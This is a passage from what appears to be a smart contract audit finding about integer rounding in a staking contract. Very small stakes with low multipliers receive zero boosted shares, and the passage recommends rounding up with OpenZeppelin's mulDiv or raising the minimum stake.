Here, when `amount` is **1 wei** and `multiplier` is a small value (e.g., 50 for a 1-month duration), the calculation results in **integer rounding down** due to Solidity's lack of floating-point arithmetic. This can cause `boostedShares` to be zero, even though the user should technically receive some fractional shares.

#### Impact  
Zero Boosted Shares: 
   Users staking small amounts (e.g., 1 wei) with low multipliers will receive `boostedShares` as **0**, resulting in no rewards for their stake.

#### Proof of Concept
Assume `minStakeAmount = 1 wei`,

When `amount = 1 wei` and `multiplier = 50`:  
```solidity
uint256 boostedShares = (1 * 50) / 100; // Result: 0
```

#### **Recommended Mitigation**

1. **Round Up the Calculation**  
   Use OpenZeppelin's `Math.mulDiv` to perform a multiplication and division with controlled rounding:
   ```solidity
   uint256 boostedShares = Math.mulDiv(amount, multiplier, 100, Math.Rounding.Up);
   ```

2. **Avoid Small Stakes Entirely**  
   Adjust the `minStakeAmount` to a higher value to avoid the scenario where rounding errors occur
